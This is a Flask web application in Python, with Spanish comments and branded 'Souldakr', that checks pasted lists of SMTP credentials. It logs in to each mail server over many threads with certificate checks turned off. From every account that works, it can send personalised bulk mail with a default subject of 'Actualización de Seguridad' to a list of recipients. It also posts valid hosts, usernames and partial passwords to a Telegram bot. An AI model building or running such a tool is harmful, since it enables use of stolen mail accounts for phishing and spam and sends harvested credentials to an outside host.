from flask import Flask, render_template, request, jsonify
import smtplib
import ssl
import socket
import threading
import time
import re
import random
import requests
from queue import Queue
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# --- CABECERAS PARA PERMITIR IFRAME DESDE FIREBASE ---
@app.after_request
def add_header(response):
    response.headers['X-Frame-Options'] = 'ALLOWALL'
    response.headers['Content-Security-Policy'] = "frame-ancestors 'self' https://souldakr-5ed8a.web.app"
    return response

# --- ESTADO GLOBAL ---
checking_state = {
    'is_checking': False,
    'valid_count': 0,
    'invalid_count': 0,
    'total_count': 0,
    'checked_count': 0,
    'logs': [],
    'valid_smtps': [],
    'current_smtp': '',
    'start_time': 0,
    'current_batch': 0,
    'total_batches': 0,
    'ip_address': '',
    'location': ''
}

# --- FUNCIONES DE UTILIDAD ---

def log_message(message, type='info'):
    timestamp = time.strftime("%H:%M:%S")
    checking_state['logs'].append({'time': timestamp, 'message': message, 'type': type})
    if len(checking_state['logs']) > 500:
        checking_state['logs'] = checking_state['logs'][-500:]

def get_client_info():
    """Obtener IP y ubicación del cliente"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    
    location = "Desconocido"
    try:
        res = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city', timeout=3)
        data = res.json()
        if data['status'] == 'success':
            location = f"{data['city']}, {data['country']}"
    except:
        pass
    
    return ip, location

def parse_smtp_line(line):
    line = line.strip()
    if not line: return None
    try:
        if '|' in line:
            parts = line.split('|')
            if len(parts) >= 4: return f"{parts[0].strip()}|{parts[1].strip()}|{parts[2].strip()}|{parts[3].strip()}"
        if '@' in line and ':' in line:
            match = re.match(r'([^:]+):([^@]+)@([^:]+):(\d+)', line)
            if match:
                user, password, host, port = match.groups()
                return f"{host.strip()}|{port.strip()}|{user.strip()}|{password.strip()}"
        if line.count(':') >= 3:
            parts = line.split(':')
            if len(parts) >= 4: return f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"
    except: return None
    return None

def personalize_content(content, email, host, user, counter, enable):
    if not enable: return content
    try:
        if '@' in email:
            name = email.split('@')[0].replace('.', ' ').title()
            domain = email.split('@')[1]
        else:
            name = email
            domain = ""
        
        now = datetime.now()
        replacements = {
            '{email}': email, '{fecha}': now.strftime("%Y-%m-%d"), '{hora}': now.strftime("%H:%M:%S"),
            '{fecha_hora}': now.strftime("%Y-%m-%d %H:%M:%S"), '{nombre}': name, '{dominio}': domain,
            '{random_id}': ''.join(random.choices('0123456789ABCDEF', k=8)),
            '{dia}': now.strftime("%d"), '{mes}': now.strftime("%m"), '{año}': now.strftime("%Y"),
            '{timestamp}': str(int(now.timestamp())), '{contador}': str(counter),
            '{smtp_host}': host, '{smtp_user}': user,
            '{hora_12}': now.strftime("%I:%M:%S"), '{am_pm}': now.strftime("%p")
        }
        for var, val in replacements.items():
            content = content.replace(var, val)
        return content
    except: return content

def test_smtp(host, port, user, password, config):
    port = int(port)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    methods = [('SSL', 465), ('STARTTLS', 587), ('STARTTLS', 25)] if port == 465 else [('STARTTLS', 587), ('SSL', 465), ('STARTTLS', 25)]
    
    for method, test_port in methods:
        server = None
        try:
            if method == 'SSL':
                server = smtplib.SMTP_SSL(host=host, port=test_port, timeout=5, context=context)
            else:
                server = smtplib.SMTP(host=host, port=test_port, timeout=5)
                server.starttls(context=context)
            
            server.login(user, password)
            checking_state['current_smtp'] = f"{host}:{port} | {user[:20]}..."
            
            if config.get('send_test_email') and config.get('recipients'):
                recipients = [r.strip() for r in config['recipients'].split('\n') if r.strip() and '@' in r]
                subject = config.get('email_subject', 'Test')
                body = config.get('email_body', 'Mensaje de prueba')
                sender = config.get('sender_name', 'Souldakr')
                enable_p = config.get('enable_personalization', True)
                
                for i, recipient in enumerate(recipients, 1):
                    try:
                        subj = personalize_content(subject, recipient, host, user, i, enable_p)
                        msg_body = personalize_content(body, recipient, host, user, i, enable_p)
                        
                        msg = MIMEMultipart('alternative')
                        msg['From'] = f"{sender} <{user}>"
                        msg['To'] = recipient
                        msg['Subject'] = subj
                        
                        if '<html>' in msg_body.lower() or '<div' in msg_body.lower():
                            msg.attach(MIMEText(msg_body, 'html', 'utf-8'))
                        else:
                            msg.attach(MIMEText(msg_body, 'plain', 'utf-8'))
                        
                        server.sendmail(user, recipient, msg.as_string())
                        log_message(f"  📤 Enviado a {recipient}", 'success')
                        time.sleep(0.2)
                    except Exception as e:
                        log_message(f"  ⚠️ Error enviando a {recipient}: {str(e)[:50]}", 'warning')
            
            server.noop()
            server.quit()
            return True, f"{method}:{test_port} - OK"
        except smtplib.SMTPAuthenticationError:
            if server:
                try: server.quit()
                except: pass
            return False, "Auth fallida"
        except Exception:
            if server:
                try: server.quit()
                except: pass
            continue
    return False, "No conectó"

def worker(queue, config):
    while not queue.empty() and checking_state['is_checking']:
        try:
            line_num, line = queue.get_nowait()
            smtp = parse_smtp_line(line)
            
            if smtp:
                parts = smtp.split('|')
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    if not port.isdigit(): port = '587'
                    
                    valid, msg = test_smtp(host, int(port), user, pwd, config)
                    
                    if valid:
                        checking_state['valid_count'] += 1
                        checking_state['valid_smtps'].append(smtp)
                        log_message(f"[{line_num}] ✅ VÁLIDO: {host}:{port} | {user}", 'success')
                        
                        if config.get('telegram_token') and config.get('telegram_chat_id'):
                            t_msg = f"✅ <b>SMTP VÁLIDO</b>\n🌐 {host}:{port}\n👤 {user}\n🔑 {pwd[:15]}..."
                            try: requests.post(f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage", data={"chat_id": config['telegram_chat_id'], "text": t_msg, "parse_mode": "HTML"}, timeout=5)
                            except: pass
                    else:
                        checking_state['invalid_count'] += 1
                        log_message(f"[{line_num}] ❌ INVÁLIDO: {host}:{port} | {msg}", 'error')
                    
                    checking_state['checked_count'] += 1
            else:
                checking_state['invalid_count'] += 1
                log_message(f"[{line_num}] ⚠️ Formato no reconocido: {line[:50]}...", 'warning')
            
            queue.task_done()
        except Exception as e:
            log_message(f"[ERROR Worker] {str(e)[:50]}", 'error')
            queue.task_done()

# --- RUTAS ---

@app.route('/')
def index():
    ip, location = get_client_info()
    checking_state['ip_address'] = ip
    checking_state['location'] = location
    return render_template('index.html')

@app.route('/start-check', methods=['POST'])
def start_check():
    data = request.json
    smtp_list = data.get('smtp_list', '')
    threads_count = int(data.get('threads', 10))
    
    config = {
        'send_test_email': data.get('send_test_email', False),
        'recipients': data.get('recipients', ''),
        'email_subject': data.get('email_subject', 'Actualización de Seguridad'),
        'email_body': data.get('email_body', 'Este es un correo de prueba.'),
        'sender_name': data.get('sender_name', 'Souldakr SMTP'),
        'enable_personalization': data.get('enable_personalization', True),
        'telegram_token': data.get('telegram_token', ''),
        'telegram_chat_id': data.get('telegram_chat_id', '')
    }
    
    if not smtp_list.strip():
        return jsonify({'error': 'La lista está vacía'}), 400
    
    checking_state.update({
        'is_checking': True, 'valid_count': 0, 'invalid_count': 0,
        'total_count': 0, 'checked_count': 0, 'logs': [], 'valid_smtps': [],
        'current_smtp': '', 'start_time': time.time()
    })
    
    lines = [l.strip() for l in smtp_list.split('\n') if l.strip()]
    checking_state['total_count'] = len(lines)
    
    BATCH_SIZE = 500
    total_batches = (len(lines) + BATCH_SIZE - 1) // BATCH_SIZE
    
    def run_batches():
        for batch_num in range(total_batches):
            if not checking_state['is_checking']: break
            
            start_idx = batch_num * BATCH_SIZE
            end_idx = min(start_idx + BATCH_SIZE, len(lines))
            batch_lines = lines[start_idx:end_idx]
            
            checking_state['current_batch'] = batch_num + 1
            checking_state['total_batches'] = total_batches
            log_message(f"📦 Procesando lote {batch_num + 1}/{total_batches} ({len(batch_lines)} SMTPs)...", 'info')
            
            queue = Queue()
            for i, line in enumerate(batch_lines, 1):
                queue.put((start_idx + i, line))
            
            threads = []
            num = min(threads_count, queue.qsize())
            for _ in range(num):
                t = threading.Thread(target=worker, args=(queue, config))
                t.daemon = True
                t.start()
                threads.append(t)
            for t in threads: t.join()
            
            time.sleep(1)
        
        checking_state['is_checking'] = False
        log_message("✅ CHECKEO COMPLETADO", 'success')
    
    threading.Thread(target=run_batches, daemon=True).start()
    return jsonify({'message': 'Iniciado', 'total': len(lines)})

@app.route('/status')
def status():
    return jsonify(checking_state)

@app.route('/stop-check', methods=['POST'])
def stop_check():
    checking_state['is_checking'] = False
    return jsonify({'message': 'Detenido'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
